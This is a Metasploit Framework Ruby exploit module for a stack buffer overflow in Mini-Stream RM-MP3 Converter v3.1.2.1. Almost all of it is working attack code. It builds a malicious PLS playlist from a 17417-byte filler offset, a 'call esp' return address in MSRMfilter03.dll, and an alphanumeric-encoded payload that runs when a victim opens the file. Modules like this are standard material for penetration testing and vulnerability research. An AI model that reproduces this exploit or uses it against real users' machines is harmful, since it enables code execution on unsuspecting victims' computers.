##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mini-Stream RM-MP3 Converter v3.1.2.1 (PLS File) Stack Buffer Overflow',
			'Description'    => %q{ 
				This module exploits a stack based buffer overflow found in Mini-Stream RM-MP3
				Converter v3.1.2.1. The overflow is triggered when an unsuspecting victim 
				opens the malicious PLS file.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Madjix',           # original discovery
					'Tiago Henriques',  # metasploit module
					'James Fitts'       # clean ups
				],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/14373/' ],
					[ 'BID', '34514' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space' => 1500,
					'BadChars' => "\x00\x09\x0a",
					'DisableNops' => 'True',
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[
						'Mini-stream RM-MP3 Converter v3.1.2.1.2010.03.30',
						{
							'Ret' => 0x100371f5, # call esp in MSRMfilter03.dll
							'Offset' => 17417
						} 
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 16 2010',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),
				], self.class)
	end

	def exploit

		pls =  "http://"
		pls << rand_text_alpha_upper(target['Offset'])
		pls << [target.ret].pack('V')
		pls << rand_text_alpha_upper(8)
		pls << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(pls)

	end

end
